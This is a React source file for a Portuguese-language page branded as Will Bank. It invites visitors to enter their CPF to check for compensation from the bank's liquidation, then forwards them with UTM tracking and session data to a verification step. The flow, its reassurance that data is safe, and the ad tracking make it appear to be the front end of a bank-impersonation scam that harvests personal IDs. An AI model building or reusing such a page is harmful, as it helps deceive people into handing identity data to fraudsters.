import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CPFInput } from "@/components/CPFInput";
import { validateCPF, unformatCPF, consultarCPF } from "@/lib/cpf";
import { ShieldCheck, Loader2, AlertTriangle } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { getSession } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";

const Login = () => {
  const navigate = useNavigate();
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Check for existing session and redirect
  useEffect(() => {
    const session = getSession();
    if (session?.cpfData && session?.currentStep && session.currentStep !== "/") {
      navigate(session.currentStep, {
        state: {
          cpfData: session.cpfData,
          valorBeneficio: session.valorBeneficio,
          protocolo: session.protocolo,
        },
        replace: true,
      });
    }
  }, [navigate]);

  const handleConsultar = async () => {
    setError("");
    
    const cpfNumbers = unformatCPF(cpf);
    
    if (cpfNumbers.length !== 11) {
      setError("Digite um CPF completo com 11 dígitos");
      return;
    }

    if (!validateCPF(cpf)) {
      setError("CPF inválido. Verifique os números digitados.");
      return;
    }

    setLoading(true);
    
    try {
      const data = await consultarCPF(cpf);
      // Navega para a página de verificação com os dados
      navigate(buildUrlWithUtm("/verificando"), { state: { cpfData: data } });
    } catch (err) {
      const message = err instanceof Error ? err.message : "Erro ao consultar CPF";
      toast({
        title: "Erro na consulta",
        description: message,
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
      <WillBankHeader />

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
        <WillBankCard className="w-full max-w-md">
          <div className="space-y-6">
            <div className="text-center space-y-2">
              <h1 className="text-xl sm:text-2xl font-bold text-foreground tracking-tight">
                Consulte seu benefício
              </h1>
              <p className="text-muted-foreground text-sm sm:text-base">
                Descubra se você tem direito a receber uma indenização referente à liquidação do Will Bank
              </p>
            </div>

            <p className="text-xs sm:text-sm text-center text-muted-foreground leading-relaxed">
              Digite seu CPF para <span className="underline font-semibold text-foreground">consultar</span> se você possui benefícios disponíveis
            </p>

            <div className="space-y-2">
              <label className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">CPF</label>
              <CPFInput 
                value={cpf} 
                onChange={setCpf} 
                disabled={loading}
                error={!!error}
              />
              {error && (
                <div className="flex items-center gap-2 text-destructive text-xs sm:text-sm bg-destructive/10 p-2.5 rounded-xl">
                  <AlertTriangle className="w-4 h-4 shrink-0" />
                  <span>{error}</span>
                </div>
              )}
            </div>

            <Button 
              onClick={handleConsultar}
              disabled={loading || unformatCPF(cpf).length < 11}
              className="w-full h-12 sm:h-14 text-sm sm:text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
            >
              {loading ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin mr-2" />
                  Consultando...
                </>
              ) : (
                "Consultar benefício"
              )}
            </Button>

            {/* Security Footer */}
            <div className="flex items-center justify-center gap-2 pt-2">
              <div className="p-1.5 bg-primary/10 rounded-full">
                <ShieldCheck className="w-3.5 h-3.5 text-primary" />
              </div>
              <span className="text-[11px] sm:text-xs text-muted-foreground font-medium">
                Seus dados estão protegidos e seguros
              </span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Login;
